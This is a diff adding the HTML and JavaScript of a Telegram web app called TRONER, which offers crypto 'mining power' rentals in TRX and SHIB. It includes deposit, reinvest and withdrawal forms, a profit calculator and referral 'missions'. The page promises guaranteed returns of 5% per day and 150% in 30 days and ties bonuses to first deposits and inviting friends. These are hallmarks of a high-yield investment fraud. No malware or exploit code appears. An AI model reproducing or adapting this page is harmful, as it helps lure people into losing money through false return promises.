@@ -1,0 +1,1112 @@
+
+
+<html style="--tg-viewport-height: 100vh;
+--tg-viewport-stable-height: 100vh;
+--status-bar-height: 0px;
+--top-window-height: 0px;
+--window-left: 0px;
+--window-right: 0px;
+--window-margin: 0px;
+--window-top:calc(100px + 0px);
+--window-bottom: 0px;">
+<head>
+<title>TRONER</title>
+<script src="//code.tidio.co/vxg6smpz31sncw0mmpilkilrykdghp4w.js" async></script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KXF3Z549DQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-KXF3Z549DQ');
+</script>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script type="text/javascript">
+window.Telegram.WebApp.expand();
+</script>
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+<link rel="icon" type="image/png" href="/favicon.png" />
+
+<style type="text/css">
+
+
+@font-face {
+  font-family: "InterTightLight";
+  src: url("fonts/InterTight-Light.ttf");
+}
+
+#res {background: #000;
+padding-bottom: 75px;
+/*min-height: 100%;*/
+width: 100%;
+}
+
+
+
+
+html, body {font-family: "InterTightLight";background: #000;
+color: #fff;
+}
+
+body {margin: 0px;
+padding: 0px;
+}
+
+.top {margin: 10px 0px;
+}
+.top .block {border: 1px solid #999;
+border-radius: 7px;
+background: #333;
+padding: 10px 20px;
+margin: 0px 20px;
+margin-bottom: 10px;
+}
+
+.top .block .img {float: left;
+}
+.top .block .img img{width: 32px;
+height: 32px;
+}
+.top .block .text {
+float: left;
+color: #fff;
+padding-left: 15px;
+}
+.top .block .text .textname {
+font-size: 14px;
+}
+.top .block .text .textcoin {
+font-size: 15px;
+font-weight: bold;
+}
+.top .block .button {
+float: right;
+}
+.top .block .button a{
+display: block;
+min-width: 55px;
+background: #fff;
+color: #000;
+text-align: center;
+text-decoration: none;
+min-height: 32px;
+line-height: 32px;
+border-radius: 7px;
+font-size: 15px;
+}
+
+.cc {clear: both;
+}
+
+
+@keyframes rotate {
+  from {
+    transform: rotate(0deg);
+  }
+
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+.center {
+display: flex;
+align-items: center;
+justify-content: center;
+text-align: center;
+margin-top: 30px;
+height: 250px;
+}
+
+.center img:first-child{
+height: 100%;
+animation: 3s linear infinite rotate;
+-webkit-touch-callout: none;
+-webkit-user-select: none;
+-khtml-user-select: none;
+-moz-user-select: none;
+-ms-user-select: none;
+user-select: none;
+}
+
+.center img:nth-child(2) {width: 50px;
+position: absolute;
+}
+
+.ghs {color: #fff;
+text-align: center;
+margin-top: 20px;
+font-weight: bold;
+}
+.ghs .b1{font-size: 28px;
+}
+.ghs .b2{
+font-size: 16px;
+}
+
+.do1 {display: block;
+padding-top: 30px;
+}
+.do1 a.btn1 {display: block;
+background: #fff;
+color: #000;
+font-weight: bold;
+width: 45%;
+margin-left: 2.5%;
+margin-right: 2.5%;
+float: left;
+text-decoration: none;
+text-align: center;
+padding: 10px 0px;
+border-radius: 6px;
+margin-bottom: 15px;
+}
+.do1::after {clear: both;
+content: "";
+}
+
+.do2 {
+display: block;
+padding: 0px 20px;
+padding-top: 10px;
+}
+.do2 a {
+display: block;
+background: #fff;
+color: #000;
+font-weight: bold;
+width: 100%;
+text-decoration: none;
+text-align: center;
+padding: 10px 0px;
+border-radius: 6px;
+}
+
+
+.dd {padding: 0px 20px;
+margin-top: 20px;
+}
+.hh {padding: 0px 20px;
+margin-top: 20px;
+font-size: 20px;
+font-weight: 600;
+}
+
+table.tb1 {border: 0px;
+padding: 0px;
+margin: 0px;
+width: 100%;
+}
+
+table.tb1 tr td{
+border-bottom: 1px solid #454545;
+padding: 7px 0px;
+}
+
+table.tb1 tr:first-child td{
+border-bottom: 1px solid #fff;
+padding: 7px 0px;
+}
+
+table.tb1 tr:last-child td{
+border-bottom: 0px solid #fff;
+}
+
+.foot {position: fixed;display: block;
+bottom: 0px;
+left: 0px;
+width: 100%;
+margin-top: -65px;
+height: 65px;
+border-top: 1px solid #eee;
+background: #000;
+padding-top: 0px;
+}
+
+.foot a {color: #fff;display: block;
+width: calc(20% - 1px);
+text-decoration: none;
+float: left;
+text-align: center;
+border-left: 1px solid #eeeeee;
+height: 65px;
+}
+
+.foot a:first-child {width: 20%;
+border-left: 0px solid #000;
+}
+
+.foot a img{height: 20px;
+margin-top: 10px;
+}
+.foot a span{padding-top: 5px;
+display: block;
+text-align: center;
+font-size: 13px;
+}
+
+.bn {text-align: center;
+padding: 0px 10px;
+padding-top: 20px;
+}
+
+.bn img{
+width: 100%;
+border-radius: 6px;
+}
+
+
+@media only screen and (min-width: 1360px) {
+#res {
+width: 600px;
+margin: auto;
+}
+.foot {
+width: 600px;
+left: auto;
+margin: auto;
+margin-top: -65px;
+}
+}
+
+
+
+.pagination {
+	list-style-type: none;
+	display: flex;
+	padding: 0;
+	margin: 0;
+	margin-top: 30px;
+	justify-content: center;
+}
+
+
+.page-item {
+	margin-right: 5px;
+}
+
+
+.page-link {
+	padding: 8px 10px;
+	display: block;
+	border-radius: 4px;
+	text-decoration: none;
+	background: #000;
+	color: #d2d9e4;
+	transition: background 0.3s;
+}
+
+
+.page-item.active .page-link {
+	background: #171f2a;
+	color: white;
+}
+
+
+.page-link.prev, .page-link.next {
+	background: #000;
+	color: #d2d9e4;
+}
+
+.page-link:not(.disabled):not(.active):hover {
+	background: #000;
+	color: white;
+}
+
+.page-item.active .page-link:hover {
+	background: #171f2a;
+}
+
+
+.page-link.disabled {
+	pointer-events: none;
+	opacity: 0.6;
+}
+
+</style>
+
+
+<script type="text/javascript">
+var ajax = {};
+ajax.get = function(url) {
+var xhr = new XMLHttpRequest();
+xhr.open('GET', url, false);
+try {
+xhr.send();
+if (xhr.status != 200) {
+
+} else {
+return xhr.responseText;
+}
+} catch(err) {
+
+}
+};
+
+ajax.post_click = function(sett) {
+var formData = new FormData(sett.form);
+var xhr = new XMLHttpRequest();
+xhr.open("POST", sett.url);
+document.getElementById(sett.el_err).innerHTML = '';
+xhr.onreadystatechange = function() {
+  if (this.readyState != 4) return;
+  var arr = JSON.parse(this.responseText);
+  if (arr['err']) {
+	  document.getElementById(sett.el_err).innerHTML = arr['err'];
+  }
+  if (arr['go']) {
+	  window.location = arr['go'];
+  }
+  if (arr['change']) {
+	  document.getElementById(arr['change']).innerHTML = arr['change_text'];
+  }
+  if(sett.butt) {
+	  sett.butt();
+  }
+}
+xhr.send(formData);
+
+};
+
+
+
+function close_modal() {
+document.querySelector('.modal_bg').style.display = 'none';
+var arr = document.getElementsByClassName('mdmall');
+for(zi=0;zi<arr.length;zi++) {
+arr[zi].style.display = 'none';
+arr[zi].querySelector('.modal_content').style.display = 'none';
+}
+}
+function open_modal(m_int) {
+document.querySelector('.modal_bg').style.display = 'block';
+document.querySelector('.mdm_block'+m_int).style.display = 'flex';
+document.querySelector('.mdm_content'+m_int).style.display = 'block';
+}
+
+document.addEventListener( 'click', (e) => {
+
+//console.log(e.target);
+
+var p_el = e.target;
+var p_ok = 1;
+for(zz=0;zz<=5;zz++) {
+//console.log(p_el.tagName);
+if (p_el.tagName!='BODY') {
+//console.log(p_el.className);
+if (p_el.className.indexOf('modal_cc')>=0) {
+p_ok = 0;
+}
+p_el = p_el.parentNode;
+}
+}
+if (p_ok==1) {
+close_modal();
+}
+//console.log(e.target);
+
+});
+
+</script>
+
+
+
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script type="text/javascript">
+
+function recheckauth() {
+
+var teg = window.Telegram.WebApp;
+
+if (teg['initDataUnsafe']['user']!==undefined) {
+if (teg['initDataUnsafe']['user']['id']!='5699636836') {
+window.location = '/auth?clear=1';
+
+}
+
+}
+
+//setTimeout(function() {//recheckauth();
+//},5000);
+
+}
+
+recheckauth();
+
+</script>
+
+</head>
+<body>
+
+<iframe src="/recheck_auth" name="fr1" id="fr1" style="display: none;"></iframe>
+
+<script type="text/javascript">
+
+
+function recheck_auth() {
+var el = document.getElementById('fr1');
+
+var uri = '/recheck_auth';
+if (el.src.indexOf('?')<0) {uri = '/recheck_auth?t=1';
+}
+
+
+el.src = uri;
+
+setTimeout(function() {recheck_auth();
+},5000);
+}
+
+recheck_auth();
+</script>
+
+<div class="modal_bg"></div>
+
+
+<div id="res">
+
+
+
+
+<style type="text/css">
+.modal_bg {
+display: none;
+position: fixed;
+background: #222;
+opacity: 0.5;
+width: 100%;
+height: 100%;
+top: 0px;
+left: 0px;
+z-index: 100;
+}
+.modal_block {
+display: none;
+position: fixed;
+width: 100%;
+height: 100%;
+top: 0px;
+left: 0px;
+align-items: center;
+z-index: 101;
+}
+.modal_content {
+display: none;
+background: #fff;
+color: #000;
+margin: auto;
+width: 100%;
+border-radius: 8px;
+padding: 25px;
+}
+
+.mc1 {
+font-size: 18px;
+font-weight: bold;
+text-align: center;
+}
+.mc2 {
+margin-top: 10px;
+font-size: 15px;
+text-align: center;
+}
+.mc3 {
+margin-top: 20px;
+font-size: 26px;
+font-weight: bold;
+text-align: center;
+}
+.mc3 img{
+height: 28px;
+vertical-align: middle;
+padding-right: 7px;
+margin-top: -3px;
+}
+
+.mc4{
+margin-top: 3px;
+font-size: 14px;
+text-align: center;
+}
+
+.mc5{
+margin-top: 7px;
+text-align: center;
+}
+
+.mc5 span{
+font-size: 20px;
+color: #aaa;
+position: absolute;
+line-height: 37px;
+right: 30px;
+}
+
+.mc5 input{
+width: 100%;
+border: 1px solid #999;
+border-radius: 6px;
+padding: 7px;
+color: #000;
+text-align: center;
+font-size: 18px;
+font-weight: bold;
+}
+
+
+.mc6{
+margin: 7px 0px;
+text-align: center;
+font-size: 14px;
+}
+
+.mc7 a.a1 {
+display: block;
+text-decoration: none;
+text-align: center;
+background: #000;
+color: #e3e3e3;
+border-radius: 6px;
+padding: 8px;
+cursor: pointer;
+}
+
+.mc7 a.a2 {
+display: block;
+text-decoration: none;
+text-align: center;
+background: #fff;
+color: #000;
+border-radius: 6px;
+padding: 8px;
+box-shadow: 0px 0px 2px #ccc;
+}
+
+.mc7 a.disabl {
+background: #aaa;
+cursor: default;
+}
+
+
+
+@media only screen and (min-width: 1360px) {
+.modal_block {
+width: 600px;
+left: auto;
+}
+}
+
+</style>
+
+
+
+
+<div class="modal_block mdmall mdm_block1" style="display: none;">
+<div class="modal_content modal_cc mdm_content1" style="display: none;">
+
+<div class="mc1">
+Mining Power (+30% bonus from 1000 TRX)
+</div>
+
+<div class="mc2">
+<div>Here you can rent mining power for 30 days.</div>
+<div>The investment profitability is 5% per day and 150% for 30 days.</div>
+</div>
+
+<div class="mc3">
+<div><img src="/img/bolt.gif" alt="" style="height: 30px;"/><span id="mghs">10.0 GH/s</span></div>
+</div>
+
+<div class="mc4">
+<div>Total Profit: ~<span id="mcalc1">150</span> TRX</div>
+<div>Daily Profit: ~<span id="mcalc2">5</span> TRX</div>
+</div>
+
+<div class="mc5">
+<span style="display: none;">TRX</span>
+<input type="number" name="sum" id="mc5_sum" value="100"/>
+</div>
+
+<div class="mc6">
+Minimum amount: 100 TRX
+</div>
+
+<form action="/" method="post" id="mf1" style="display: none;">
+<input type="hidden" name="add_deposit" value="1"/>
+<input type="hidden" name="sum" id="mf1_sum" value="100"/>
+</form>
+
+<form action="/" method="post" id="mf1" style="display: none;">
+<input type="hidden" name="add_reinvest" value="1"/>
+<input type="hidden" name="sum" id="mf1_sum" value="100"/>
+</form>
+
+
+
+<div class="mc7">
+<a href="javascript:send_dep()" class="a1" id="mba_add">Add</a>
+<a href="javascript:close_modal()" class="a2">Back</a>
+</div>
+
+
+</div>
+</div>
+
+
+
+
+
+<div class="modal_block mdmall mdm_block5" style="display: none;">
+<div class="modal_content modal_cc mdm_content5" style="display: none;">
+
+<div class="mc1">
+Mining Power (Reinvest) (+30% bonus from 1000 TRX)
+</div>
+
+<div class="mc2">
+<div style="font-weight: bold;">You account balance: 0.00 TRX</div>
+<div><br/></div>
+<div>Here you can rent mining power for 30 days.</div>
+<div>The investment profitability is 5% per day and 150% for 30 days.</div>
+</div>
+
+<div class="mc3">
+<div><img src="/img/bolt.gif" alt="" style="height: 30px;"/><span id="mghs5">10.0 GH/s</span></div>
+</div>
+
+<div class="mc4">
+<div>Total Profit: ~<span id="mcalc15">150</span> TRX</div>
+<div>Daily Profit: ~<span id="mcalc25">5</span> TRX</div>
+</div>
+
+<div class="mc5">
+<span style="display: none;">TRX</span>
+<input type="number" name="sum" id="mc5_sum5" value="100"/>
+</div>
+
+<div class="mc6">
+Minimum amount: 100 TRX
+<div style="color: red; font-weight: bold; margin-bottom: 10px;" id="err_mod5"></div>
+</div>
+
+<form action="/" method="post" id="mf15" style="display: none;">
+<input type="hidden" name="add_reinvest" value="1"/>
+<input type="hidden" name="sum" id="mf1_sum5" value="100"/>
+</form>
+
+<div class="mc7">
+<a href="javascript:send_dep5()" class="a1" id="mba_add5">Add</a>
+<a href="javascript:close_modal()" class="a2">Back</a>
+</div>
+
+
+</div>
+</div>
+
+
+
+
+
+<div class="modal_block mdmall mdm_block3" style="display: none;">
+<div class="modal_content modal_cc mdm_content3" style="display: none;">
+
+<div class="mc1">
+Enter your personal TRX address
+</div>
+
+
+<div class="mc2">
+<div>This amount will be sent to the TRC20 compatible wallet address</div>
+<div style="font-weight: bold; margin: 7px 0px;">Minimum send amount is 20 TRX</div>
+</div>
+
+<form action="" method="post" id="mf3">
+<input type="hidden" name="send" value="1" style="font-weight: normal;"/>
+
+<div class="mc5">
+<input type="hidden" name="kosh" value="wallet1"/>
+<input type="text" name="kosh5" value="" style="font-weight: normal;" placeholder="Set your TRX (TRC20) Address in Security Page" readonly/>
+</div>
+
+<div class="mc5">
+<input type="number" name="sum" id="send_sum1" value="" style="font-weight: normal;" placeholder="Amount"/>
+</div>
+
+</form>
+
+
+<div class="mc2">
+<div style="font-weight: bold; color: orange; font-size: 18px;">Network fee: 2.5 TRX</div>
+<div style="font-weight: bold; margin: 7px 0px; font-size: 18px;">Receive amount: <span id="receive1">0</span> TRX</div>
+<div style="color: red; font-weight: bold; margin-bottom: 10px;" id="send_err1"></div>
+</div>
+
+
+<div class="mc7">
+<a href="javascript:send_send()" class="a1" id="mba_add3">Send</a>
+<br/>
+<a href="javascript:close_modal()" class="a2">Not yet</a>
+</div>
+
+
+</div>
+</div>
+
+
+
+<div class="modal_block mdmall mdm_block4" style="display: none;">
+<div class="modal_content modal_cc mdm_content4" style="display: none;">
+
+<div class="mc1">
+Enter your personal SHIB address
+</div>
+
+
+<div class="mc2">
+<div>This amount will be sent to the BEP20 compatible wallet address</div>
+<div style="font-weight: bold; margin: 7px 0px;">Minimum send amount is 530000 SHIB</div>
+</div>
+
+<form action="" method="post" id="mf4">
+<input type="hidden" name="send" value="2" style="font-weight: normal;"/>
+
+<div class="mc5">
+<input type="hidden" name="kosh" value="wallet2"/>
+<input type="text" name="kosh5" value="" style="font-weight: normal;" placeholder="Set your SHIB (BEP20) Address in Security Page" readonly/>
+</div>
+
+<div class="mc5">
+<input type="number" name="sum" id="send_sum2" value="" style="font-weight: normal;" placeholder="Amount"/>
+</div>
+
+</form>
+
+
+<div class="mc2">
+<div style="font-weight: bold; color: orange; font-size: 18px;">Network fee: 30000 SHIB</div>
+<div style="font-weight: bold; margin: 7px 0px; font-size: 18px;">Receive amount: <span id="receive2">0</span> SHIB</div>
+<div style="color: red; font-weight: bold; margin-bottom: 10px;" id="send_err2"></div>
+</div>
+
+
+<div class="mc7">
+<a href="javascript:send_send2()" class="a1" id="mba_add4">Send</a>
+<br/>
+<a href="javascript:close_modal()" class="a2">Not yet</a>
+</div>
+
+
+</div>
+</div>
+
+
+
+
+
+<script type="text/javascript">
+
+
+
+function send_send() {
+	var sett = {};
+	sett.url = '/';
+	sett.form = document.getElementById('mf3');
+	sett.el_err = 'send_err1';
+	ajax.post_click(sett);
+}
+
+function send_send2() {
+	var sett = {};
+	sett.url = '/';
+	sett.form = document.getElementById('mf4');
+	sett.el_err = 'send_err2';
+	ajax.post_click(sett);
+}
+
+
+document.getElementById('send_sum1').addEventListener( 'keyup', (e) => {
+var val = Number(document.getElementById('send_sum1').value);
+if (val>=20) {
+document.getElementById('mba_add3').className = 'a1';
+} else {
+document.getElementById('mba_add3').className = 'a1 disabl';
+}
+var zval = (val-2.5);
+if (zval<0) {zval = 0;}
+document.getElementById('receive1').innerHTML = zval.toFixed(2);
+});
+
+document.getElementById('send_sum2').addEventListener( 'keyup', (e) => {
+var val = Number(document.getElementById('send_sum2').value);
+if (val>=530000) {
+document.getElementById('mba_add4').className = 'a1';
+} else {
+document.getElementById('mba_add4').className = 'a1 disabl';
+}
+var zval = (val-30000);
+if (zval<0) {zval = 0;}
+document.getElementById('receive2').innerHTML = zval.toFixed(2);
+});
+
+
+
+
+var mc5_sum = document.getElementById('mc5_sum');
+
+function send_dep() {
+var val = Number(mc5_sum.value);
+if (val>=100) {
+document.getElementById('mf1_sum').value = val;
+document.getElementById('mf1').submit();
+}
+}
+
+
+
+
+function check_trx(vals) {
+var vals2 = ''+vals+'';
+if (vals2.indexOf('.')>=0) {
+var ex = vals2.split('.');
+var nn = ex[1].length;
+if (nn>3) {
+vals = vals.toFixed(3);
+}
+}
+return vals;
+}
+
+function calc() {
+var val = Number(mc5_sum.value);
+var a = 'GH/s';
+var sp = (val/10);
+if (val>=10000) {a = 'TH/s'; sp = (val/10000);}
+var val1 = (((val/100)*5)*30);
+var val2 = ((val/100)*5);
+document.getElementById('mcalc1').innerHTML = check_trx(val1);
+document.getElementById('mcalc2').innerHTML = check_trx(val2);
+document.getElementById('mghs').innerHTML = sp.toFixed(1)+' '+a;
+
+}
+
+mc5_sum.addEventListener( 'keyup', (e) => {
+var val = Number(mc5_sum.value);
+if (val>=100) {
+document.getElementById('mba_add').className = 'a1';
+} else {
+document.getElementById('mba_add').className = 'a1 disabl';
+}
+calc();
+});
+
+
+
+var mc5_sum5 = document.getElementById('mc5_sum5');
+
+function send_dep5() {
+var val = Number(mc5_sum5.value);
+if (val>=100) {
+document.getElementById('mba_add5').href = '#';
+document.getElementById('mf1_sum5').value = val;
+
+sett = {};
+sett.form = document.getElementById('mf15');
+sett.url = '/';
+sett.el_err = 'err_mod5';
+
+var formData = new FormData(sett.form);
+var xhr = new XMLHttpRequest();
+xhr.open("POST", sett.url);
+document.getElementById(sett.el_err).innerHTML = '';
+xhr.onreadystatechange = function() {
+  if (this.readyState != 4) {	document.getElementById('mba_add5').href = 'javascript:send_dep5()';
+  	return;
+  }
+  var arr = JSON.parse(this.responseText);
+  if (arr['err']) {
+	  document.getElementById(sett.el_err).innerHTML = arr['err'];
+	  document.getElementById('mba_add5').href = 'javascript:send_dep5()';
+  }
+  if (arr['ok']) {      document.getElementById(sett.el_err).style.color = 'green';      document.getElementById(sett.el_err).innerHTML = arr['ok'];
+      setTimeout(function() {
+	  window.location = '/';
+	  },2000);
+  }
+
+
+}
+xhr.send(formData);
+
+
+
+}
+}
+
+
+function calc2() {
+var val = Number(mc5_sum5.value);
+var a = 'GH/s';
+var sp = (val/10);
+if (val>=10000) {a = 'TH/s'; sp = (val/10000);}
+var val1 = (((val/100)*5)*30);
+var val2 = ((val/100)*5);
+document.getElementById('mcalc15').innerHTML = check_trx(val1);
+document.getElementById('mcalc25').innerHTML = check_trx(val2);
+document.getElementById('mghs5').innerHTML = sp.toFixed(1)+' '+a;
+
+}
+
+mc5_sum5.addEventListener( 'keyup', (e) => {
+var val = Number(mc5_sum5.value);
+if (val>=100) {
+document.getElementById('mba_add5').className = 'a1';
+} else {
+document.getElementById('mba_add5').className = 'a1 disabl';
+}
+calc2();
+});
+
+
+</script>
+<style type="text/css">
+.mb1 {font-size: 20px;
+text-align: center;
+line-height: 30px;
+}
+.mb2 {
+font-size: 15px;
+text-align: center;
+line-height: 30px;
+}
+
+.top .block .button a {margin-top: 3px;
+}
+
+.top .block .text .textname {font-size: 12px;
+}
+
+.top .block {padding: 10px 10px;
+}
+
+.top .block .text .textcoin {font-size: 13px;
+margin-top: 5px;
+}
+
+</style>
+
+<div class="dd">
+
+
+<div class="mb1">5 missions available</div>
+<div class="mb2">Complete the missions to get the SHIB</div>
+
+
+
+</div>
+
+
+<div class="top" id="mission_block">
+
+
+<div class="block">
+<div class="img"><img src="img/icon1.png" alt=""/></div>
+<div class="text">
+<div class="textname">Welcome bonus</div>
+<div class="textcoin" style="color: #999;"><img src="img/coin11.png" alt="" style="height: 14px; border-radius: 50%; font-weight: bold; vertical-align: middle; margin-top: -4px;"/> 10,000 SHIB</div>
+</div>
+<div class="button">
+<a href="/missions?id=57896">claim</a>
+</div>
+<div class="cc"></div>
+</div>
+<div class="block">
+<div class="img"><img src="img/icon2.png" alt=""/></div>
+<div class="text">
+<div class="textname">Join Troner community</div>
+<div class="textcoin" style="color: #999;"><img src="img/coin11.png" alt="" style="height: 14px; border-radius: 50%; font-weight: bold; vertical-align: middle; margin-top: -4px;"/> 5,000 SHIB</div>
+</div>
+<div class="button">
+<a href="https://t.me/Troner_Mining" style="min-width: 35px;"><img src="img/e6.png" alt="" style="height: 20px; width: 20px; margin-top: 6px;"/></a>
+</div>
+<div class="cc"></div>
+</div>
+<div class="block">
+<div class="img"><img src="img/icon3.png" alt=""/></div>
+<div class="text">
+<div class="textname">Subscribe to Troner announcements</div>
+<div class="textcoin" style="color: #999;"><img src="img/coin11.png" alt="" style="height: 14px; border-radius: 50%; font-weight: bold; vertical-align: middle; margin-top: -4px;"/> 5,000 SHIB</div>
+</div>
+<div class="button">
+<a href="https://t.me/Troner_community" style="min-width: 35px;"><img src="img/e6.png" alt="" style="height: 20px; width: 20px; margin-top: 6px;"/></a>
+</div>
+<div class="cc"></div>
+</div>
+<div class="block">
+<div class="img"><img src="img/icon4.png" alt=""/></div>
+<div class="text">
+<div class="textname">Invite your first friend</div>
+<div class="textcoin" style="color: #999;"><img src="img/coin11.png" alt="" style="height: 14px; border-radius: 50%; font-weight: bold; vertical-align: middle; margin-top: -4px;"/> 5,000 SHIB</div>
+</div>
+<div class="button">
+<a href="friends.php" style="min-width: 35px;"><img src="img/e6.png" alt="" style="height: 20px; width: 20px; margin-top: 6px;"/></a>
+</div>
+<div class="cc"></div>
+</div>
+<div class="block">
+<div class="img"><img src="img/icon5.png" alt=""/></div>
+<div class="text">
+<div class="textname">Rent your first power booster</div>
+<div class="textcoin" style="color: #999;"><img src="img/coin11.png" alt="" style="height: 14px; border-radius: 50%; font-weight: bold; vertical-align: middle; margin-top: -4px;"/> 100,000 SHIB</div>
+</div>
+<div class="button">
+<a href="javascript:open_modal(1)" style="min-width: 35px;"><img src="img/e6.png" alt="" style="height: 20px; width: 20px; margin-top: 6px;"/></a>
+</div>
+<div class="cc"></div>
+</div>
+
+</div>
+
+
+<div class="bn" style="padding: 0px 20px;">
+<img src="img/10_3.jpg" alt=""/>
+</div>
+
+
+
+<script type="text/javascript">
+
+function auto_refresh() {
+
+	var response = ajax.get('/missions');
+
+	var parser = new DOMParser();
+	var htmlDoc = parser.parseFromString(response, 'text/html');
+	document.getElementById('mission_block').innerHTML = htmlDoc.getElementById('mission_block').innerHTML;
+
+	setTimeout("auto_refresh()",5000);
+
+}
+
+auto_refresh();
+</script>
+
+
+
+
+
+<div class="foot">
+<a href="/"><img src="/img/icon_1_blue.svg" alt=""/><span>Home</span></a>
+<a href="/wallet"><img src="/img/icon_4_blue.svg" alt=""/><span>Wallet</span></a>
+<a href="/friends"><img src="/img/icon_3_blue.svg" alt=""/><span>Friends</span></a>
+<a href="/missions"><img src="/img/icon_2_blue.svg" alt=""/><span>Missions</span></a>
+<a href="/rating"><img src="/img/icon_Star.svg" alt=""/><span>Rating</span></a>
+</div>
+
+
+</div>
+
+
+</body>
+</html>
